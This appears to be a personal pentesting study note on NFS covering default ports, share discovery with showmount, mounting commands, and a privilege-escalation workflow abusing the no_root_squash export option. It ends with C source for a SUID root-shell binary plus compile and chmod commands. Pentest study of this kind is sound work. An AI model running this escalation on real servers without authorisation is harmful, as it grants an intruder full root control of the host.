---
tags:
  - "#type/tech-specific" 
---
# Fundamentals

NFS - network file system

**Default Ports:**

- tcp111
- tcp2049

a file system or part of a file system can be mounted remotely on a server and then accessed almost like local files

[https://docs.oracle.com/cd/E19683-01/816-4882/6mb2ipq7l/index.html](https://docs.oracle.com/cd/E19683-01/816-4882/6mb2ipq7l/index.html)

- configuration info in /etc/exports
- critical option for privesc: no_root_sqash

# Pentesting

## Discovery

**Tools:**

- nfs-common
- showmount
	- show mounted nfs shares on ip adress
	- eg. `showmount -e [IP]`

## Connect to / Mount nfs share

**Tools:**

- mount.nfs
- mount - see below

`sudo mount -t [type] IP:[ip adress and share name] -nolock`

eg: `sudo mount -t nfs IP:share /tmp/mount/ -nolock`

| Option | Purpose |
|----------|--------------|
| `-t` | type of device to mount, eg. nfs |
| `-nolock` | do not use nlm locking |

## Privilege Escalation - Linux

**Prerequisites:** options `rw` and `no_root_sqash` must be set

**Workflow:**

1. connect to nfs / mount nfs share
2. generate file that launches bash (see section payloads)
3. set ownership of file to "root" and set suid
4. execute on target system -> root shell is started

**Payload**

c code to execute shell with suid and guid set

compile with: `gcc [filename] -o [filename] -w`

set suid with `chmod +s [filename]`

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(void)
{
	setgid(0);
	setuid(0);
	system("/bin/bash -p");
	return 0;
}
``` 
